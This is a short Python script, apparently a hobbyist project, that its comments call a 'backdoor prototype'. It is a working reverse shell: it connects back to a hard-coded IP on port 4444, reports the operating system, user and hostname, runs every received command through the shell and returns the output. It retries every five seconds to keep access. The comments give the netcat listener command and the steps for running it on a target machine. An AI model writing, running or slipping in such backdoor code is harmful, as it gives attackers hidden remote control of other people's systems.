# This is a backdoor prototype that will ran by opening up a port by using nc -lvp 4444 (or any other port)
# User will then download this file on another linux device (I used raspberry pi as my hardware)
# On the other device, run python backdoorProto.py
# Do not use Wi-Fi with AP isolation

import socket
import subprocess
import os
import time
import platform

def connect():
    # User's IP and port
    server_ip = '192.168.11.19'
    server_port = 4444

    while True:
        try:

            # Creates a TCP Client connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server_ip, server_port))
            
            # Identifies connection 
            sys_info = f"\n--- CONNECTION ESTABLISHED ---\nOS: {platform.system()} {platform.release()}\nUser: {subprocess.getoutput('whoami')}\nNode: {platform.node()}\n------------------------------\n"
            s.send(sys_info.encode())

            while True:
                # Send the prompt
                prompt = f"{subprocess.getoutput('whoami')}@{os.getcwd()}: "
                s.send(prompt.encode())
                
                # Data received
                data = s.recv(1024)


                if not data: break
                
                usrcmd = data.decode("utf-8").strip()

                # End with command "end"
                if usrcmd.lower() == "end": break

                # For "cd" commands, avoids only having a child process change 
                if usrcmd.startswith("cd "):
                    try:
                        os.chdir(usrcmd[3:].strip())
                    except OSError as e:
                        s.send(f"Error: {str(e)}\n".encode())
                    continue

                # Execute and return results
                proc = subprocess.Popen(usrcmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout, stderr = proc.communicate()
                s.send(stdout + stderr)

            s.close()
        
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    connect()


